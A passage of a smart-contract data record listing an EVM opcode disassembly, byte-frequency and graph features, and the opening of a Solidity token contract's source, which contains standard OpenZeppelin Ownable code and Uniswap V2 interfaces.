DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 SUB DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP2 PUSH32 DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MUL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 DUP5 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP3 DUP3 MSTORE PUSH1 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH1 DUP4 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH2 DUP2 DUP6 PUSH2 JUMP JUMPDEST SWAP4 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST DUP1 PUSH1 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 JUMPI DUP2 MLOAD PUSH2 DUP9 DUP3 PUSH2 JUMP JUMPDEST SWAP8 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 DUP2 ADD SWAP1 POP PUSH2 JUMP JUMPDEST POP DUP6 SWAP4 POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP9 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP8 PUSH2 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 DUP7 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP6 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 UNKNOWN_0xcd LOG0 BASEFEE UNKNOWN_0xf9 UNKNOWN_0xfb UNKNOWN_0xf8 UNOFFICIAL_DUP DUP1 UNKNOWN_0x2c UNKNOWN_0xdc PUSH8 UNKNOWN_0xba UNKNOWN_0x28 EQ ADDMOD MOD CODECOPY UNKNOWN_0xc6 CREATE2 UNKNOWN_0x4c DUP10 UNKNOWN_0x2d INVALID_0x7e",
  "opcode_entropy": 4.6095064524472,
  "opcode_count": 3527,
  "unique_opcodes": 88,
  "byte_entropy": 5.214785623660251,
  "byte_0x": 0.0001414027149321267,
  "byte_60": 0.06165158371040724,
  "byte_80": 0.01583710407239819,
  "byte_40": 0.009191176470588236,
  "byte_52": 0.01414027149321267,
  "byte_34": 0.0008484162895927602,
  "byte_15": 0.008484162895927601,
  "byte_61": 0.05627828054298643,
  "byte_00": 0.08017533936651584,
  "byte_10": 0.002828054298642534,
  "byte_57": 0.00904977375565611,
  "byte_fd": 0.003110859728506787,
  "byte_5b": 0.043410633484162894,
  "byte_50": 0.04157239819004525,
  "byte_04": 0.006221719457013574,
  "byte_36": 0.001414027149321267,
  "byte_f5": 0.001414027149321267,
  "byte_35": 0.0007070135746606335,
  "byte_e0": 0.0008484162895927602,
  "byte_1c": 0.0002828054298642534,
  "byte_63": 0.0038178733031674207,
  "byte_71": 0.0012726244343891403,
  "byte_18": 0.002828054298642534,
  "byte_a6": 0.0002828054298642534,
  "byte_11": 0.003252262443438914,
  "byte_97": 0.0004242081447963801,
  "byte_c5": 0.0002828054298642534,
  "byte_b3": 0.0008484162895927602,
  "byte_7c": 0.0004242081447963801,
  "byte_22": 0.0011312217194570137,
  "byte_66": 0.001414027149321267,
  "byte_14": 0.008625565610859729,
  "byte_02": 0.007918552036199095,
  "byte_78": 0.0002828054298642534,
  "byte_dd": 0.0012726244343891403,
  "byte_62": 0.0007070135746606335,
  "byte_ed": 0.0002828054298642534,
  "byte_3e": 0.0005656108597285068,
  "byte_96": 0.0005656108597285068,
  "byte_f2": 0.0007070135746606335,
  "byte_e3": 0.0004242081447963801,
  "byte_8b": 0.0002828054298642534,
  "byte_c6": 0.0004242081447963801,
  "byte_f8": 0.0002828054298642534,
  "byte_87": 0.0009898190045248868,
  "byte_ea": 0.0002828054298642534,
  "byte_e2": 0.0004242081447963801,
  "byte_56": 0.033936651583710405,
  "byte_8d": 0.0007070135746606335,
  "byte_a5": 0.0004242081447963801,
  "byte_cb": 0.0005656108597285068,
  "byte_0c": 0.0008484162895927602,
  "byte_95": 0.0008484162895927602,
  "byte_d8": 0.0007070135746606335,
  "byte_9b": 0.0005656108597285068,
  "byte_41": 0.0004242081447963801,
  "byte_2a": 0.0001414027149321267,
  "byte_a9": 0.0002828054298642534,
  "byte_05": 0.0012726244343891403,
  "byte_9c": 0.0002828054298642534,
  "byte_bb": 0.0001414027149321267,
  "byte_48": 0.001838235294117647,
  "byte_23": 0.0007070135746606335,
  "byte_b8": 0.0004242081447963801,
  "byte_72": 0.002403846153846154,
  "byte_d3": 0.0002828054298642534,
  "byte_01": 0.026442307692307692,
  "byte_31": 0.0005656108597285068,
  "byte_3c": 0.0001414027149321267,
  "byte_e5": 0.0004242081447963801,
  "byte_67": 0.0005656108597285068,
  "byte_49": 0.0002828054298642534,
  "byte_bd": 0.0004242081447963801,
  "byte_5a": 0.0008484162895927602,
  "byte_5e": 0.0002828054298642534,
  "byte_b4": 0.0004242081447963801,
  "byte_70": 0.0008484162895927602,
  "byte_a0": 0.0011312217194570137,
  "byte_82": 0.01583710407239819,
  "byte_d2": 0.0002828054298642534,
  "byte_06": 0.0026866515837104072,
  "byte_de": 0.0002828054298642534,
  "byte_03": 0.008766968325791855,
  "byte_fa": 0.0004242081447963801,
  "byte_09": 0.0012726244343891403,
  "byte_a7": 0.0005656108597285068,
  "byte_16": 0.01541289592760181,
  "byte_0d": 0.001838235294117647,
  "byte_51": 0.008766968325791855,
  "byte_0f": 0.001414027149321267,
  "byte_91": 0.018665158371040724,
  "byte_90": 0.03591628959276018,
  "byte_12": 0.005090497737556561,
  "byte_c2": 0.0005656108597285068,
  "byte_f3": 0.0026866515837104072,
  "byte_32": 0.0015554298642533936,
  "byte_81": 0.021917420814479636,
  "byte_2d": 0.0002828054298642534,
  "byte_13": 0.007211538461538462,
  "byte_7d": 0.0007070135746606335,
  "byte_92": 0.007070135746606335,
  "byte_3f": 0.0004242081447963801,
  "byte_5d": 0.0005656108597285068,
  "byte_7b": 0.0009898190045248868,
  "byte_1d": 0.0001414027149321267,
  "byte_b1": 0.0005656108597285068,
  "byte_9e": 0.0004242081447963801,
  "byte_ab": 0.0002828054298642534,
  "byte_bc": 0.0004242081447963801,
  "byte_19": 0.003393665158371041,
  "byte_c9": 0.0004242081447963801,
  "byte_7f": 0.0038178733031674207,
  "byte_ec": 0.0005656108597285068,
  "byte_e7": 0.0001414027149321267,
  "byte_9a": 0.0002828054298642534,
  "byte_f9": 0.0002828054298642534,
  "byte_0a": 0.0026866515837104072,
  "byte_88": 0.0015554298642533936,
  "byte_21": 0.0007070135746606335,
  "byte_39": 0.0002828054298642534,
  "byte_6f": 0.0016968325791855204,
  "byte_07": 0.0019796380090497737,
  "byte_47": 0.0022624434389140274,
  "byte_b0": 0.0012726244343891403,
  "byte_c7": 0.0004242081447963801,
  "byte_4d": 0.0004242081447963801,
  "byte_db": 0.0002828054298642534,
  "byte_d4": 0.0004242081447963801,
  "byte_08": 0.0029694570135746605,
  "byte_f7": 0.0004242081447963801,
  "byte_0e": 0.0007070135746606335,
  "byte_54": 0.006080316742081448,
  "byte_1f": 0.0015554298642533936,
  "byte_20": 0.019372171945701358,
  "byte_3b": 0.0007070135746606335,
  "byte_83": 0.006928733031674208,
  "byte_6b": 0.0004242081447963801,
  "byte_9f": 0.0001414027149321267,
  "byte_33": 0.0012726244343891403,
  "byte_84": 0.006080316742081448,
  "byte_f1": 0.0008484162895927602,
  "byte_c3": 0.0008484162895927602,
  "byte_79": 0.0011312217194570137,
  "byte_53": 0.0002828054298642534,
  "byte_8c": 0.0005656108597285068,
  "byte_73": 0.012302036199095022,
  "byte_ff": 0.22115384615384615,
  "byte_ad": 0.0005656108597285068,
  "byte_1b": 0.001838235294117647,
  "byte_c8": 0.0007070135746606335,
  "byte_69": 0.0007070135746606335,
  "byte_68": 0.0011312217194570137,
  "byte_fc": 0.0004242081447963801,
  "byte_37": 0.0004242081447963801,
  "byte_aa": 0.0002828054298642534,
  "byte_2b": 0.0002828054298642534,
  "byte_c4": 0.0002828054298642534,
  "byte_a1": 0.0002828054298642534,
  "byte_28": 0.0005656108597285068,
  "byte_ef": 0.0004242081447963801,
  "byte_a3": 0.0007070135746606335,
  "byte_89": 0.0007070135746606335,
  "byte_a2": 0.0009898190045248868,
  "byte_93": 0.0011312217194570137,
  "byte_ae": 0.0002828054298642534,
  "byte_fb": 0.0002828054298642534,
  "byte_17": 0.0022624434389140274,
  "byte_74": 0.0012726244343891403,
  "byte_c1": 0.0002828054298642534,
  "byte_a4": 0.0004242081447963801,
  "byte_dc": 0.0005656108597285068,
  "byte_bf": 0.0001414027149321267,
  "byte_b6": 0.0001414027149321267,
  "byte_0b": 0.0009898190045248868,
  "byte_5c": 0.0005656108597285068,
  "byte_46": 0.0002828054298642534,
  "byte_86": 0.0021210407239819003,
  "byte_85": 0.002403846153846154,
  "byte_55": 0.001414027149321267,
  "byte_e1": 0.0004242081447963801,
  "byte_eb": 0.0002828054298642534,
  "byte_d1": 0.0002828054298642534,
  "byte_4f": 0.0004242081447963801,
  "byte_42": 0.0005656108597285068,
  "byte_1e": 0.0002828054298642534,
  "byte_c0": 0.0001414027149321267,
  "byte_b2": 0.0002828054298642534,
  "byte_29": 0.0005656108597285068,
  "byte_b9": 0.0001414027149321267,
  "byte_25": 0.0001414027149321267,
  "byte_cd": 0.0005656108597285068,
  "byte_cc": 0.0001414027149321267,
  "byte_77": 0.0009898190045248868,
  "byte_ce": 0.0001414027149321267,
  "byte_64": 0.0011312217194570137,
  "byte_94": 0.0007070135746606335,
  "byte_59": 0.0001414027149321267,
  "byte_44": 0.0002828054298642534,
  "byte_d0": 0.0001414027149321267,
  "byte_da": 0.0002828054298642534,
  "byte_af": 0.0002828054298642534,
  "byte_76": 0.0002828054298642534,
  "byte_30": 0.0008484162895927602,
  "byte_3d": 0.0009898190045248868,
  "byte_e9": 0.0007070135746606335,
  "byte_27": 0.0004242081447963801,
  "byte_26": 0.0002828054298642534,
  "byte_8e": 0.0001414027149321267,
  "byte_1a": 0.0035350678733031674,
  "byte_45": 0.0004242081447963801,
  "byte_b7": 0.0001414027149321267,
  "byte_24": 0.0011312217194570137,
  "byte_2f": 0.0001414027149321267,
  "byte_65": 0.002828054298642534,
  "byte_e4": 0.0007070135746606335,
  "byte_be": 0.0001414027149321267,
  "byte_2c": 0.0002828054298642534,
  "byte_4e": 0.0007070135746606335,
  "byte_6e": 0.0012726244343891403,
  "byte_6d": 0.0005656108597285068,
  "byte_75": 0.0002828054298642534,
  "byte_7a": 0.0004242081447963801,
  "byte_6c": 0.0008484162895927602,
  "byte_ca": 0.0001414027149321267,
  "byte_3a": 0.0004242081447963801,
  "byte_d6": 0.0001414027149321267,
  "byte_43": 0.0004242081447963801,
  "byte_5f": 0.0002828054298642534,
  "byte_f6": 0.0001414027149321267,
  "byte_6a": 0.0001414027149321267,
  "byte_fe": 0.0002828054298642534,
  "byte_4b": 0.0001414027149321267,
  "byte_98": 0.0001414027149321267,
  "byte_f4": 0.0001414027149321267,
  "byte_d5": 0.0001414027149321267,
  "byte_58": 0.0001414027149321267,
  "byte_ba": 0.0001414027149321267,
  "byte_4c": 0.0001414027149321267,
  "byte_7e": 0.0001414027149321267,
  "num_nodes": 380,
  "num_edges": 86,
  "avg_degree": 0.45263157894736844,
  "density": 0.0005971392862102485,
  "connected_components": 308,
  "avg_clustering": 0.003508771929824561,
  "timeline_sequence": [],
  "sourcecode": "{{\n  \"language\": \"Solidity\",\n  \"sources\": {\n    \"deploy/Contract.sol\": {\n      \"content\": \"/*\\n\\nhttps://www.skulldoge.com/\\n\\n                                                                         \u2584\u2588\u2588\u2588\u2588\\n                                                                         \\\"\u2588\u2588\u2588\u2588\u2588\\n                                                                         ,\u2588\u2588\u2588\u2588\u2588\u2584 \u2514\u2588\u2584\\n                                                                       ,\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\n                                                                     ,\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\\n                                                                   \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2559\u2580\u2559\\n                                                                 \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\\n           ,\u2584\u2584\u2584                                               ,\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2580\\\"\\n          \u2590\u2588\u2588\u2588\u2588\u2588                                            \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2580'\\n          \u2590\u258c\u2590\u2588\u2588\u2588\u2584                      ,\u2584\u2584\u2584\u2584\u2584\u2584\u2584,         \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2580\\\"\\n       ,\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u00e7               \u2553\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584,\u2553\u2584\u2588\u2588\u2588\u2588\u2588\u2580\u2514\\n       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584          \u2553\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2559\\n        \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584     \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2584\u2584,\\n         \u2580\u2588\u2580\u2584\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\\\\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\n         \u2590\u2584\u2588\u2580\u2580\u2588\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580 \u2588\u2588\u2588\u2588\u2588\u2580\u2559    \u2580\u2588\u2588\u2588\\n         \u2590\u2588\u2310  \u2588     \u2590\u2588   \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2580         \u2588\u2588\\n         \u2590\u2588          \u258c   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c  *\u2584       \u2588\u2588\u2584\\n         j\u258c          \u258c   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c    \u2580\u2588\u2584\u2584\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\\n         j\u258c          \u258c   \u2580\u2584\u2588\u2588\u2588\u2580\u2514        \u2559\u2588\u2588\u2588\u2588\u2588\u2584     \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c\\n         \u2590\u2591          \u2229  ,\u2588\u2588\u2588\u2588\u2588           \u2590\u2588\u2588\u2514\u2559\u2580\u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580 \u2588\\n         \u2590\u2550          - j\u2588\u2588\u2588\u2588\u2588\u258c      \u2588    \u2590\u2588\u2588    \u2559\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c \u0192\\n         \u2590U         j\u2229  \u2580\u2580\u2588\u2588\u2588\u2588      \u2588\u2588   \u2588\u2588\u258c  \u2588\u2584  \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\\n         \u2590\u258c         \u2590\u258c  \u2584\u2588\u2588\u2588\u2588\u2588\u2588,   \u2584\u2588\u2588\u2588\u2584\u2588\u2588\u2588\u2588  \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c \u2590\u2588\u2588\u2588\u2584\\n         \u2588\u258c          \u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584\\n         \u2588\u2588        \u2584\u2588\u2588\u2588\u2588\u2588\u2580  \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2584,,,\u2584\u2584\u2584\u2584\\n         \u2588\u258c     \u2584\u2588\u2588\u2588\u2588\u2588\u2580      \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\n             \u2553\u2584\u2588\u2588\u2588\u2588\u2588\u2580          \u2590\u2588\u2588   \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2514     \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588`\\n          ,\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2580            j\u2588U    \u2588\u2588\u2580  \u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588        \\\"\u2588\u2588\u2588\u2588\u2588\u2588\u2580'\\n     , ,\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580               \u2588     \u2588     \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588          \u2588\u2588\u2588\u2588\u2584,\\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580                 \u2588    \u2590\u2580      \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580           \u2559\u2580\u2580\u2580\u2580\u2580\\n    \u2559\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584                \u2588    \u2588         \u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2580\\n       \u2588\u2588\u2584\u2584\u2588\u2588\u2588\u2588\u2580               \u2590\u2588   \u2588\u258c\\n         \u2559\u2580\u2559\u2514                  \u2588\u2588 ,\u2588\u2580\u2588\\n                              \u2588\u2580\u2580\u2588\u2588\u2588\u2588\u2588\\n                             \u2588\u2588\u2588\u2588\u2580\u2580\u2588\u2588\u2588\\n\\n*/\\n\\n// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity ^0.8.4;\\n\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\\n// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _setOwner(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        require(owner() == _msgSender(), 'Ownable: caller is not the owner');\\n        _;\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _setOwner(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\\n        _setOwner(newOwner);\\n    }\\n\\n    function _setOwner(address newOwner) private {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\\ninterface IUniswapV2Factory {\\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\\n\\n    function feeTo() external view returns (address);\\n    function feeToSetter() external view returns (address);\\n\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\\n    function allPairs(uint) external view returns (address pair);\\n    function allPairsLength() external view returns (uint);\\n\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n\\n    function setFeeTo(address) external;\\n    function setFeeToSetter(address) external;\\n}\\n\\ninterface IUniswapV2Router01 {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n    function removeLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETH(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountToken, uint amountETH);\\n    function removeLiquidityWithPermit(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETHWithPermit(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountToken, uint amountETH);\\n    function swapExactTokensForTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapTokensForExactTokens(\\n        uint amountOut,\\n        uint amountInMax,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\n\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountETH);\\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        